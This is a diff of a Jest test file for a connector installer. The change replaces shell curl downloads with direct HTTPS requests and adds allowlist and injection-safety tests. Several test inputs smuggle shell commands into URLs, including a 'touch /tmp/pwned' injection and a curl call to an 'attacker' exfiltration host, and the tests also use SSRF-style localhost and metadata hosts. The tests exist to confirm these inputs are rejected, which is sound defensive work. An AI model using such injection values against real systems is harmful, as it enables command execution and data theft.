@@ -18,7 +18,8 @@ import { getConnectorRegistry } from '../../src/registry/connector-registry';
 import { ConnectorMetadata, InstalledConnector } from '../../src/types/connector.types';
 import * as fs from 'fs';
 import * as crypto from 'crypto';
-import { promisify } from 'util';
+import * as https from 'https';
+import { EventEmitter } from 'events';
 import { exec } from 'child_process';
 
 // Mock dependencies
@@ -34,12 +35,51 @@ jest.mock('../../src/registry/connector-registry');
 jest.mock('fs');
 jest.mock('child_process');
 jest.mock('crypto');
+jest.mock('https');
+
+/**
+ * Minimal fake `http.IncomingMessage` for exercising the installer's
+ * redirect-following HTTPS download logic without a real socket.
+ */
+type MockDownloadResponse = EventEmitter & {
+  statusCode: number;
+  headers: Record<string, string>;
+  resume: jest.Mock;
+  pipe: jest.Mock;
+};
+
+function createMockResponse(
+  statusCode: number,
+  headers: Record<string, string> = {}
+): MockDownloadResponse {
+  // EventEmitter is augmented with the handful of IncomingMessage members
+  // the installer actually touches (statusCode/headers/resume/pipe); a
+  // full http.IncomingMessage is unnecessary for this test double.
+  const response = new EventEmitter() as MockDownloadResponse;
+  response.statusCode = statusCode;
+  response.headers = headers;
+  response.resume = jest.fn();
+  response.pipe = jest.fn((dest: EventEmitter) => {
+    process.nextTick(() => dest.emit('finish'));
+    return dest;
+  });
+  return response;
+}
+
+type MockWriteStream = EventEmitter & { destroy: jest.Mock };
+
+function createMockWriteStream(): MockWriteStream {
+  const stream = new EventEmitter() as MockWriteStream;
+  stream.destroy = jest.fn();
+  return stream;
+}
 
 describe('ConnectorInstaller', () => {
   let installer: ConnectorInstaller;
   let mockRegistry: any;
   let mockExecAsync: jest.Mock;
   let mockFsPromises: any;
+  let mockHttpsGet: jest.Mock;
 
   const sampleMetadata: ConnectorMetadata = {
     type: 'test-connector',
@@ -61,6 +101,8 @@ describe('ConnectorInstaller', () => {
 
   beforeEach(() => {
     jest.clearAllMocks();
+    delete process.env['CONNECTOR_REGISTRY_URL'];
+    delete process.env['CONNECTOR_VERIFY_CHECKSUM'];
 
     // Mock exec
     mockExecAsync = jest.fn().mockResolvedValue({ stdout: '', stderr: '' });
@@ -74,7 +116,29 @@ describe('ConnectorInstaller', () => {
       access: jest.fn().mockResolvedValue(undefined),
     };
     (fs as any).promises = mockFsPromises;
-    (fs as any).existsSync = jest.fn().mockReturnValue(true);
+    // Node's automocked `fs` module exposes some bindings (existsSync,
+    // createWriteStream) as getter-only accessor properties; a plain
+    // assignment throws, so redefine them instead.
+    Object.defineProperty(fs, 'existsSync', {
+      value: jest.fn().mockReturnValue(true),
+      configurable: true,
+      writable: true,
+    });
+    Object.defineProperty(fs, 'createWriteStream', {
+      value: jest.fn(() => createMockWriteStream()),
+      configurable: true,
+      writable: true,
+    });
+
+    // Mock https.get: default to an immediate, successful download so
+    // tests that don't care about download internals (install/update
+    // workflows exercised via the registry path) still resolve.
+    mockHttpsGet = https.get as jest.Mock;
+    mockHttpsGet.mockImplementation((_url: unknown, _options: unknown, callback: (res: MockDownloadResponse) => void) => {
+      const response = createMockResponse(200);
+      process.nextTick(() => callback(response));
+      return new EventEmitter();
+    });
 
     // Mock crypto
     const mockHash = {
@@ -115,12 +179,10 @@ describe('ConnectorInstaller', () => {
   });
 
   describe('downloadConnector', () => {
-    it('should download from URL', async () => {
+    it('should download from a trusted URL over HTTPS (no shell)', async () => {
       const options: DownloadOptions = {
-        url: 'https://example.com/connector.tar.gz',
+        url: 'https://github.com/happy-tech/connectors/releases/download/v1/connector.tar.gz',
       };
-
-      mockExecAsync.mockResolvedValue({ stdout: '', stderr: '' });
 
       const packagePath = await installer.downloadConnector(
         'test-connector',
@@ -128,9 +190,18 @@ describe('ConnectorInstaller', () => {
       );
 
       expect(mockFsPromises.mkdir).toHaveBeenCalled();
-      expect(mockExecAsync).toHaveBeenCalledWith(
-        expect.stringContaining('curl -L -o')
-      );
+      expect(mockHttpsGet).toHaveBeenCalledTimes(1);
+
+      const [calledUrl, calledOptions] = mockHttpsGet.mock.calls[0];
+      expect(calledUrl).toBeInstanceOf(URL);
+      expect((calledUrl as URL).href).toBe(options.url);
+      expect((calledUrl as URL).hostname).toBe('github.com');
+      expect(calledOptions).toEqual({
+        headers: { 'User-Agent': 'happycmdb-connector-installer/1.0' },
+      });
+
+      // No shell was ever involved in the download.
+      expect(mockExecAsync).not.toHaveBeenCalled();
       expect(packagePath).toContain('test-connector.tar.gz');
     });
 
@@ -148,6 +219,7 @@ describe('ConnectorInstaller', () => {
 
       expect(packagePath).toBe('/local/path/connector.tar.gz');
       expect(mockExecAsync).not.toHaveBeenCalled();
+      expect(mockHttpsGet).not.toHaveBeenCalled();
     });
 
     it('should download from registry with version', async () => {
@@ -155,28 +227,37 @@ describe('ConnectorInstaller', () => {
         version: '1.5.0',
       };
 
-      process.env.CONNECTOR_REGISTRY_URL = 'https://registry.test.com';
+      process.env['CONNECTOR_REGISTRY_URL'] = 'https://registry.test.com';
 
       await installer.downloadConnector('test-connector', options);
 
-      expect(mockExecAsync).toHaveBeenCalledWith(
-        expect.stringContaining('https://registry.test.com/connectors/test-connector/1.5.0')
+      expect(mockHttpsGet).toHaveBeenCalledTimes(1);
+      const [calledUrl] = mockHttpsGet.mock.calls[0];
+      expect((calledUrl as URL).href).toBe(
+        'https://registry.test.com/connectors/test-connector/1.5.0/package.tar.gz'
       );
     });
 
     it('should download latest version by default', async () => {
       await installer.downloadConnector('test-connector');
 
-      expect(mockExecAsync).toHaveBeenCalledWith(
-        expect.stringContaining('/latest/package.tar.gz')
-      );
+      expect(mockHttpsGet).toHaveBeenCalledTimes(1);
+      const [calledUrl] = mockHttpsGet.mock.calls[0];
+      expect((calledUrl as URL).href).toContain('/latest/package.tar.gz');
+      expect((calledUrl as URL).hostname).toBe('registry.happycmdb.io');
     });
 
     it('should throw error on download failure', async () => {
-      mockExecAsync.mockRejectedValue(new Error('Download failed'));
+      mockHttpsGet.mockImplementation((_url: unknown, _options: unknown, _callback: unknown) => {
+        const request = new EventEmitter();
+        process.nextTick(() => request.emit('error', new Error('Download failed')));
+        return request;
+      });
 
       await expect(
-        installer.downloadConnector('test-connector', { url: 'https://bad.url' })
+        installer.downloadConnector('test-connector', {
+          url: 'https://github.com/happy-tech/connectors/releases/download/v1/connector.tar.gz',
+        })
       ).rejects.toThrow('Failed to download connector test-connector');
     });
 
@@ -188,6 +269,159 @@ describe('ConnectorInstaller', () => {
           localPath: '/nonexistent/file.tar.gz',
         })
       ).rejects.toThrow('Failed to download connector test-connector');
+    });
+
+    describe('download URL allowlist and injection safety', () => {
+      it('should reject non-https URLs', async () => {
+        await expect(
+          installer.downloadConnector('test-connector', {
+            url: 'http://github.com/happy-tech/connectors/releases/download/v1/connector.tar.gz',
+          })
+        ).rejects.toThrow(/only https is allowed/);
+
+        expect(mockHttpsGet).not.toHaveBeenCalled();
+        expect(mockExecAsync).not.toHaveBeenCalled();
+      });
+
+      it('should reject URLs with embedded credentials', async () => {
+        await expect(
+          installer.downloadConnector('test-connector', {
+            url: 'https://attacker:token@github.com/happy-tech/connectors/releases/download/v1/connector.tar.gz',
+          })
+        ).rejects.toThrow(/embedded credentials/);
+
+        expect(mockHttpsGet).not.toHaveBeenCalled();
+      });
+
+      it('should reject IP-literal download hosts (IPv4 and IPv6)', async () => {
+        await expect(
+          installer.downloadConnector('test-connector', {
+            url: 'https://93.184.216.34/connector.tar.gz',
+          })
+        ).rejects.toThrow(/disallowed host/);
+
+        await expect(
+          installer.downloadConnector('test-connector', {
+            url: 'https://[2606:2800:220:1:248:1893:25c8:1946]/connector.tar.gz',
+          })
+        ).rejects.toThrow(/disallowed host/);
+
+        expect(mockHttpsGet).not.toHaveBeenCalled();
+      });
+
+      it('should reject numeric/hex-obfuscated IP-literal hosts', async () => {
+        // "2130706433" and "0x7f000001" both denote 127.0.0.1; the WHATWG
+        // URL parser itself normalizes these to dotted-decimal, and the
+        // resulting IP literal is then rejected like any other.
+        await expect(
+          installer.downloadConnector('test-connector', {
+            url: 'https://2130706433/connector.tar.gz',
+          })
+        ).rejects.toThrow(/disallowed host/);
+
+        await expect(
+          installer.downloadConnector('test-connector', {
+            url: 'https://0x7f000001/connector.tar.gz',
+          })
+        ).rejects.toThrow(/disallowed host/);
+      });
+
+      it('should reject localhost and other internal-only hosts', async () => {
+        await expect(
+          installer.downloadConnector('test-connector', {
+            url: 'https://localhost/connector.tar.gz',
+          })
+        ).rejects.toThrow(/disallowed host/);
+
+        await expect(
+          installer.downloadConnector('test-connector', {
+            url: 'https://metadata.internal/connector.tar.gz',
+          })
+        ).rejects.toThrow(/disallowed host/);
+      });
+
+      it('should reject hosts outside the registry / GitHub allowlist', async () => {
+        await expect(
+          installer.downloadConnector('test-connector', {
+            url: 'https://evil.example.com/connector.tar.gz',
+          })
+        ).rejects.toThrow(/not in the trusted connector download allowlist/);
+
+        expect(mockHttpsGet).not.toHaveBeenCalled();
+      });
+
+      it('should treat a shell-metacharacter-laden trusted URL as an inert literal and never invoke a shell', async () => {
+        const maliciousUrl =
+          'https://github.com/happy-tech/connectors/releases/download/v1/pkg.tar.gz";touch /tmp/pwned;echo "';
+
+        const packagePath = await installer.downloadConnector('test-connector', {
+          url: maliciousUrl,
+        });
+
+        // The whole string was parsed as a single URL value and handed
+        // directly to the HTTPS client -- never concatenated into, or
+        // interpreted by, a shell command.
+        expect(mockExecAsync).not.toHaveBeenCalled();
+        expect(mockHttpsGet).toHaveBeenCalledTimes(1);
+        const [calledUrl] = mockHttpsGet.mock.calls[0];
+        expect((calledUrl as URL).hostname).toBe('github.com');
+        expect(packagePath).toContain('test-connector.tar.gz');
+      });
+
+      it('should reject a malicious URL whose payload resolves to an untrusted host', async () => {
+        const maliciousUrl = 'https://evil.example.com/x";curl http://attacker/exfil;"';
+
+        await expect(
+          installer.downloadConnector('test-connector', { url: maliciousUrl })
+        ).rejects.toThrow(/not in the trusted connector download allowlist/);
+
+        expect(mockExecAsync).not.toHaveBeenCalled();
+        expect(mockHttpsGet).not.toHaveBeenCalled();
+      });
+
+      it('should follow a redirect to a trusted GitHub asset host', async () => {
+        mockHttpsGet
+          .mockImplementationOnce((_url: unknown, _options: unknown, callback: (res: MockDownloadResponse) => void) => {
+            const response = createMockResponse(302, {
+              location: 'https://objects.githubusercontent.com/release/connector.tar.gz',
+            });
+            process.nextTick(() => callback(response));
+            return new EventEmitter();
+          })
+          .mockImplementationOnce((_url: unknown, _options: unknown, callback: (res: MockDownloadResponse) => void) => {
+            const response = createMockResponse(200);
+            process.nextTick(() => callback(response));
+            return new EventEmitter();
+          });
+
+        const packagePath = await installer.downloadConnector('test-connector', {
+          url: 'https://github.com/happy-tech/connectors/releases/download/v1/connector.tar.gz',
+        });
+
+        expect(mockHttpsGet).toHaveBeenCalledTimes(2);
+        expect((mockHttpsGet.mock.calls[1][0] as URL).hostname).toBe(
+          'objects.githubusercontent.com'
+        );
+        expect(packagePath).toContain('test-connector.tar.gz');
+      });
+
+      it('should reject a redirect to an untrusted host mid-download', async () => {
+        mockHttpsGet.mockImplementationOnce((_url: unknown, _options: unknown, callback: (res: MockDownloadResponse) => void) => {
+          const response = createMockResponse(302, {
+            location: 'https://evil.example.com/connector.tar.gz',
+          });
+          process.nextTick(() => callback(response));
+          return new EventEmitter();
+        });
+
+        await expect(
+          installer.downloadConnector('test-connector', {
+            url: 'https://github.com/happy-tech/connectors/releases/download/v1/connector.tar.gz',
+          })
+        ).rejects.toThrow(/not in the trusted connector download allowlist/);
+
+        expect(mockHttpsGet).toHaveBeenCalledTimes(1);
+      });
     });
   });
 
@@ -672,11 +906,15 @@ describe('ConnectorInstaller', () => {
 
   describe('Error Handling', () => {
     it('should handle network timeouts during download', async () => {
-      mockExecAsync.mockRejectedValue(new Error('Timeout'));
+      mockHttpsGet.mockImplementation((_url: unknown, _options: unknown, _callback: unknown) => {
+        const request = new EventEmitter();
+        process.nextTick(() => request.emit('error', new Error('Timeout')));
+        return request;
+      });
 
       await expect(
         installer.downloadConnector('test-connector', {
-          url: 'https://slow.server/package.tar.gz',
+          url: 'https://github.com/happy-tech/connectors/releases/download/v1/connector.tar.gz',
         })
       ).rejects.toThrow('Failed to download connector');
     });
